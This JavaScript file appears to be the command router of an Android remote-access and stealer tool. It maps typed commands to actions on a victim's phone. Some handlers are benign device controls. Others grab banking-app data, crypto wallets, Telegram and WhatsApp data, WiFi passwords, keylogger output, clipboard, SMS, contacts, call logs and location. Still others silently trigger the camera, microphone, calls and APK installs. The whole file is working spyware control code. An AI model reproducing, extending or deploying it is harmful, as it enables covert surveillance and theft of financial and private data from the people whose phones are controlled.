// ── Action Router — intercepts "do X" requests and routes directly, no AI needed ──

const ACTIONS = [
  {
    patterns: [/^(?:open|launch|start|run)\s+(.+)$/i, /^open\s+(?:the\s+)?(.+?)(?:\s+app)?$/i],
    description: 'Open app by name',
    handler: async (match, sendCmd, collectResp) => {
      const appName = match[1].toLowerCase().trim()
      // Step 1: find the package name
      const r1 = await sendCmd('shell', `pm list packages | grep -i "${appName}"`)
      if (!r1.ok) return `Failed to search for ${appName}`
      const resp = await collectResp('shell', 10000)
      if (!resp) return `Could not find app "${appName}"`
      const pkgs = resp.split('\n').filter(l => l.includes('package:')).map(l => l.replace('package:', '').trim())
      if (pkgs.length === 0) return `No package found matching "${appName}"`
      const pkg = pkgs[0]
      // Step 2: open it
      const r2 = await sendCmd('shell', `monkey -p ${pkg} 1`)
      if (!r2.ok) return `Failed to open ${pkg}`
      await collectResp('shell', 5000)
      return `Opened ${pkg} (${pkgs.length > 1 ? `+${pkgs.length - 1} more matches` : ''})`
    }
  },
  {
    patterns: [/^(?:send\s+(?:an?\s+)?)?sms\s+(.+)$/i, /^text\s+(.+)$/i, /^message\s+(.+)$/i],
    description: 'Send SMS: sms <number> <message>',
    handler: async (match, sendCmd, collectResp) => {
      const rest = match[1].trim()
      const numMatch = rest.match(/^(\+?\d[\d\s-]{5,15})\s+(.+)/)
      if (!numMatch) return 'Usage: sms <number> <message>'
      const number = numMatch[1].replace(/[\s-]/g, '')
      const message = numMatch[2].trim()
      const r = await sendCmd('shell', `am start -a android.intent.action.SENDTO -d sms:${number} --es sms_body '${message.replace(/'/g, "\\'")}' --ez exit_on_sent true`)
      return r.ok ? `SMS sent to ${number}` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^call\s+(.+)$/i],
    description: 'Call a number: call <number>',
    handler: async (match, sendCmd, collectResp) => {
      const number = match[1].replace(/[\s-]/g, '').trim()
      const r = await sendCmd('shell', `am start -a android.intent.action.CALL -d tel:${number}`)
      return r.ok ? `Calling ${number}...` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:take\s+)?screenshot/i, /^screen(?:shot)?$/i],
    description: 'Take screenshot',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('screenshot', '')
      return r.ok ? '📸 Screenshot sent' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:take\s+)?(?:photo|picture|camera)/i],
    description: 'Take photo',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('camera', '')
      return r.ok ? '📷 Photo captured' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:record\s+)?(?:mic|audio|microphone|voice)/i],
    description: 'Record audio',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('mic', '')
      return r.ok ? '🎧 Recording...' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:browse|search|google)\s+(.+)/i, /^search\s+(?:google\s+)?for\s+(.+)/i, /^go\s+to\s+(.+)/i],
    description: 'Browse/search: browse <url or query>',
    handler: async (match, sendCmd, collectResp) => {
      const query = match[1].trim()
      const isUrl = query.startsWith('http://') || query.startsWith('https://') || query.includes('.')
      const url = isUrl ? query : `https://google.com/search?q=${encodeURIComponent(query)}`
      const r = await sendCmd('shell', `am start -a android.intent.action.VIEW -d '${url}'`)
      return r.ok ? `Opened ${url}` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:install)\s+(.+)/i],
    description: 'Install APK: install <path>',
    handler: async (match, sendCmd, collectResp) => {
      const path = match[1].trim()
      const r = await sendCmd('shell', `pm install ${path}`)
      if (!r.ok) return `Failed: ${r.err}`
      const resp = await collectResp('shell', 30000)
      return resp?.includes('Success') ? `✅ Installed ${path}` : `Install result: ${resp?.slice(0, 500) || 'no output'}`
    }
  },
  {
    patterns: [/^(?:get\s+)?contacts/i, /^(?:list|show)\s+contacts/i],
    description: 'Get contacts',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('contacts', '')
      return r.ok ? '👥 Contacts fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?(?:sms|texts?|messages)/i],
    description: 'Get SMS messages',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('sms', '')
      return r.ok ? '💬 SMS fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?(?:call.?log|history|calls)/i],
    description: 'Get call log',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('call_log', '')
      return r.ok ? '📞 Call log fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?location/i, /^(?:gps|where\s+am\s+i)/i],
    description: 'Get location',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('location', '')
      return r.ok ? '📍 Location fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:show|get|list)\s+(?:installed\s+)?apps/i, /^what\s+apps/i],
    description: 'List installed apps',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('installed', '')
      return r.ok ? '📦 App list fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:grab|extract|dump)\s+(?:all|everything|data)/i, /^grabber\s+all/i],
    description: 'Grab all data',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('grabber', 'all')
      return r.ok ? '🔍 Grabber running on all targets...' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:grab|extract)\s+(?:bank|banking|finance)/i, /^grabber\s+banks/i],
    description: 'Grab banking apps',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('grabber', 'banks')
      return r.ok ? '🏦 Banking data grab started' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:grab|extract)\s+(?:wallet|crypto)/i, /^grabber\s+wallets/i],
    description: 'Grab crypto wallets',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('grabber', 'wallets')
      return r.ok ? '🔐 Wallet grab started' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:grab|extract)\s+(?:telegram|tg)/i, /^grabber\s+telegram/i],
    description: 'Grab Telegram data',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('grabber', 'telegram')
      return r.ok ? '✈️ Telegram grab started' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:grab|extract)\s+(?:whatsapp|wa)/i, /^grabber\s+whatsapp/i],
    description: 'Grab WhatsApp data',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('grabber', 'whatsapp')
      return r.ok ? '💬 WhatsApp grab started' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?(?:wifi|wifi.?pass)/i, /^wifi\s+passwords/i],
    description: 'Get WiFi passwords',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('wifi', '')
      return r.ok ? '📡 WiFi passwords fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?(?:keylog|keystrokes|keys)/i, /^start\s+keylog/i],
    description: 'Get keylogger data',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('keylog', '')
      return r.ok ? '⌨️ Keylog data fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:get\s+)?clipboard/i, /^clipboard/i],
    description: 'Get clipboard',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('clipboard', '')
      return r.ok ? '📋 Clipboard fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:show|get)\s+notif(?:ication)?s/i, /^notifications/i],
    description: 'Get notifications',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('notifications', '')
      return r.ok ? '🔔 Notifications fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:check\s+)?battery/i, /^battery(?:\s+status)?$/i],
    description: 'Check battery',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('shell', 'dumpsys battery')
      return r.ok ? '🔋 Battery info fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:check\s+)?(?:network|internet|connection)/i, /^netstat/i],
    description: 'Check network connections',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('shell', 'netstat -tlnp')
      return r.ok ? '🌐 Network info fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:list|show)\s+(?:running\s+)?process(?:es)?/i, /^ps\b/i, /^what'?s?\s+running/i],
    description: 'List running processes',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('shell', 'ps -A')
      return r.ok ? '🔬 Process list fetched' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:make|show)\s+(?:a\s+)?(?:toast|popup|notification)\s+(.+)/i],
    description: 'Show a toast/popup message',
    handler: async (match, sendCmd, collectResp) => {
      const text = match[1].trim().replace(/'/g, "\\'")
      const r = await sendCmd('shell', `am broadcast -a android.intent.action.SHOW_TOAST --es message '${text}'`)
      return r.ok ? `📢 Toast shown: "${match[1].trim()}"` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:set\s+)?volume\s+(\d+)/i],
    description: 'Set volume level (0-15)',
    handler: async (match, sendCmd, collectResp) => {
      const level = Math.min(15, Math.max(0, parseInt(match[1])))
      const r = await sendCmd('shell', `media volume --set ${level}`)
      return r.ok ? `🔊 Volume set to ${level}` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^(?:vibrate|buzz)\s*(?:for\s+)?(\d+)?/i],
    description: 'Vibrate device',
    handler: async (match, sendCmd, collectResp) => {
      const duration = parseInt(match[1]) || 1000
      const r = await sendCmd('shell', `service call vibrator 2 i32 ${duration} i32 0`)
      return r.ok ? `📳 Vibrating for ${duration}ms` : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^lock\s*(?:device|screen|phone)?$/i, /^(?:turn\s+off\s+screen)$/i],
    description: 'Lock the device',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('shell', 'input keyevent 26')
      return r.ok ? '🔒 Device locked' : `Failed: ${r.err}`
    }
  },
  {
    patterns: [/^unlock\s*(?:device|screen|phone)?$/i],
    description: 'Unlock the device (swipe up)',
    handler: async (match, sendCmd, collectResp) => {
      const r = await sendCmd('shell', 'input keyevent 82')
      return r.ok ? '🔓 Device unlocked' : `Failed: ${r.err}`
    }
  },
]

export function matchAction(text) {
  const clean = text.toLowerCase().trim()
  for (const action of ACTIONS) {
    for (const pattern of action.patterns) {
      const match = clean.match(pattern)
      if (match) return { action, match }
    }
  }
  return null
}

export function getActionHelp() {
  return ACTIONS.map(a => a.description).join('\n')
}
